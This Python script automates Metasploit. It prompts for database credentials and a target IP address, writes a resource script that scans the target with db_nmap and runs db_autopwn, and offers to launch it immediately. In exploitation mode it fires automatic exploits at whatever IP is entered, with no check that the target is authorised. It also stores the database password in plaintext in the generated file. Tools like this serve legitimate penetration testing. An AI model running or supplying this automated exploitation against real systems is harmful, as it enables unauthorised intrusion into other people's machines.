#!/usr/bin/python3
#Installation Guidance can be referred to http://alexchaoyihuang.blogspot.com/2021/05/metasploitmsfconsolemetasploit_31.html
#1. Initialization
#1.1. Confirm the existence of msfconsol command, db_autopwd plugin, and the scripts folder
#1.2. Confirm the status of Postgresql database
#2. Ask and get Resource Script needed information
#2.1. Ask for Database information
#2.2. Ask and get the target's IP address
#3. Generate a metasploit Resource script targeting the IP address
#Write: db_nmap scans the target
#Write: generate scan result
#Write: import db_autopwn
#Write: autopwn
#Write: generate autopwn report
#4. Execute the Resource script

import subprocess
import os

def tip1(path_rc_file):
    print("Manually execute the RC file:\nmsfconsole -r " + path_rc_file + "\n")

#1.1:
path_msfconsole = "/opt/metasploit-framework/bin/msfconsole"
path_msf_plugin = "/opt/metasploit-framework/embedded/framework/plugins/db_autopwn.rb"
if not os.path.exists(path_msfconsole):
    print("msfconsole does not exist!")
    exit()
if not os.path.exists(path_msf_plugin):
    print("msf autopwn plugin does not exist!")
    exit()

#1.2:
command_enable_postgresql = "systemctl start postgresql"
subprocess.call(command_enable_postgresql, shell=True)

#2.1:
database_name = input("Database Name: ")
database_account = input("Database Account: ")
database_password = input("Database Password: ")
answer_for_mode = input("Working Mode ([C]hecking | [E]xploitation) : ")
answer_for_mode = str(answer_for_mode)
if answer_for_mode.lower() == 'e':
    exploitation_mode = 1
elif answer_for_mode.lower() == 'c':
    exploitation_mode = 0
else:
    print("Unknown answer! Exiting...")
    exit()

#2.2:
target_ip = input("What is the target\'s IP address: ")

#3:
resource_script_file_path = "/opt/metasploit-framework/embedded/framework/scripts/resource/auto_exploit_" + target_ip + ".rc"
if os.path.exists(resource_script_file_path):
    os.remove(resource_script_file_path)
rs = open(resource_script_file_path, "w")
rs.write("db_connect " + database_account + ":" + database_password + "@127.0.0.1/" + database_name + "\n")
rs.write("db_nmap " + target_ip + "\n")
rs.write("load db_autopwn\n")
if exploitation_mode == 1:
    rs.write("db_autopwn -t -p -e " + target_ip + "\n")
else:
    rs.write("db_autopwn -t -p " + target_ip + "\n")
rs.close()
print("Resource Script has been generated at " + resource_script_file_path)

#4:
answer_for_execution = input("Would you like to execute AutoPWN? (Y/N) : ")
answer_for_execution = str(answer_for_execution)
if answer_for_execution.lower() == 'y':
    subprocess.call([path_msfconsole, "-r", resource_script_file_path])
elif answer_for_execution.lower() == 'n':
    tip1(resource_script_file_path)
    exit()
else:
    print("Unknown answer!\n")
    tip1(resource_script_file_path)
    exit()

